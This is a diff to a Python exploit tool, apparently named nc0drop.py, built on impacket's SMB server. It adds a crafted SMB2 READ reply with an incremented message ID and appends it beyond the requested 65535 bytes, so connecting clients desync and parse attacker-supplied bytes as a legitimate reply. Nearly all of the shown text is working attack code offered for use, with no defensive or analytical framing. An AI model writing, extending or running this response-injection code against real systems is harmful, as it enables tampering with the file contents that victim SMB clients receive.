@@ -16,6 +16,7 @@ This wrapper reproduces that vehicle and adds:
 usage: nc0drop.py PORT [--dialect 0x0210] [--share DIR]
 """
 import os
+import struct
 import sys
 from impacket import smb
 from impacket.smbserver import SimpleSMBServer, SMB2Commands
@@ -46,8 +47,33 @@ DLEN = 0
 if "--dlen" in sys.argv:
     DLEN = int(sys.argv[sys.argv.index("--dlen") + 1])
 INJECT = b""
+MIDOFF = 1
 if "--inject" in sys.argv:
     INJECT = open(sys.argv[sys.argv.index("--inject") + 1], "rb").read()
+if "--midoff" in sys.argv:
+    MIDOFF = int(sys.argv[sys.argv.index("--midoff") + 1])
+
+def build_followup_read_reply(mid, sid, tid, payload=b"INJECTED\r\n"):
+    """Second READ reply with mid = original+1 — the client's next expected
+    reply after the desynced first READ. Payload = attacker bytes the art
+    handler may parse as the file content."""
+    h = bytearray(64)
+    h[0:4] = b"\xfeSMB"
+    struct.pack_into("<H", h, 4, 64)
+    struct.pack_into("<H", h, 6, 1)          # credit grant
+    struct.pack_into("<I", h, 8, 0)          # status success
+    h[12] = 8                                # SMB2 READ
+    struct.pack_into("<H", h, 14, 1)
+    struct.pack_into("<I", h, 16, 1)         # server-to-redir
+    struct.pack_into("<Q", h, 24, mid)
+    struct.pack_into("<Q", h, 36, sid)
+    struct.pack_into("<I", h, 44, tid)
+    body = struct.pack("<HH", 17, 0)
+    body += struct.pack("<I", len(payload))
+    body += struct.pack("<HH", 0x50, 0)      # DataOffset 0x50, reserved
+    body += payload
+    frame = b"\x00" + len(h + body).to_bytes(3, "big") + bytes(h) + body
+    return frame
 
 _ORIG_RD = SMB2Commands.smb2Read
 
@@ -66,13 +92,21 @@ def patched_rd(connId, smbServer, recvPacket):
                 # desync injection: client requested 65535; it consumes exactly
                 # 65535 bytes of the reply; anything beyond stays in the socket
                 # and is parsed as the NEXT PDU. Pad the payload to 65535 then
-                # append the crafted NetBIOS frame.
+                # append a follow-up READ reply with mid = original+1 (the
+                # client's next expected reply), carrying attacker payload.
                 REQ = 65535
-                buf = buf + b"\x00" * max(0, REQ - len(buf)) + INJECT
+                try:
+                    mid = recvPacket['MessageID']
+                    sid = recvPacket['SessionID']
+                    tid = recvPacket['TreeID']
+                except Exception:
+                    mid, sid, tid = 0, 0, 0
+                frame = build_followup_read_reply(mid + MIDOFF, sid, tid)
+                buf = buf + b"\x00" * max(0, REQ - len(buf)) + frame
                 resp['Buffer'] = bytes(buf)
                 resp['DataLength'] = len(buf)
-                print('READ inject: real=%d padded+injected total=%d (frame %dB at socket offset %d)'
-                      % (real, len(buf), len(INJECT), REQ), flush=True)
+                print('READ inject: real=%d total=%d frame=%dB mid=%d->%d'
+                      % (real, len(buf), len(frame), mid, mid + MIDOFF), flush=True)
             elif DLEN and real:
                 resp['DataLength'] = real + DLEN
                 print('READ patch: real=%d declared=%d' % (real, real + DLEN), flush=True)
